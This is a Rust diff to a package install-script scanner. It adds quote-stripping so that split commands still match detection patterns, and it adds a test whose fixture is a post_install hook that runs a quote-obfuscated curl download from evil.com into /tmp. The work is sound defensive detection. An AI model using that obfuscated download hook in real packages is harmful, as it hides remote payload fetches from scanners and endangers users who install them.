@@ -12,15 +12,26 @@ impl Feature for InstallScriptAnalysis {
             return Vec::new();
         };
         let content = crate::shared::text::strip_comment_lines(raw);
+        // Same quote-split handling as pkgbuild_analysis: `cu""rl` runs `curl`.
+        let normalized = crate::shared::shell_normalize::strip_quotes(&content);
 
         let compiled = patterns::compiled_patterns();
         let mut signals = Vec::new();
 
         for pat in compiled {
-            if pat.regex.is_match(&content) {
+            let hit = pat.regex.is_match(&content)
+                || normalized.lines().any(|line| pat.regex.is_match(line));
+            if hit {
                 let matched_line = content
                     .lines()
                     .find(|line| pat.regex.is_match(line))
+                    .or_else(|| {
+                        normalized
+                            .lines()
+                            .zip(content.lines())
+                            .find(|(normalized_line, _)| pat.regex.is_match(normalized_line))
+                            .map(|(_, original)| original)
+                    })
                     .map(|line| line.trim().to_string());
                 signals.push(Signal {
                     id: pat.id.clone(),
@@ -284,5 +295,11 @@ post_upgrade() {
 }
 "#);
         assert!(ids.is_empty(), "Benign install script should trigger no signals, got: {ids:?}");
+    }
+
+    #[test]
+    fn install_quote_split_curl_detected() {
+        let ids = analyze("post_install() {\n    c\"ur\"l -s https://evil.com/x -o /tmp/x\n}");
+        assert!(has(&ids, "P-INSTALL-CURL"), "got: {ids:?}");
     }
 }
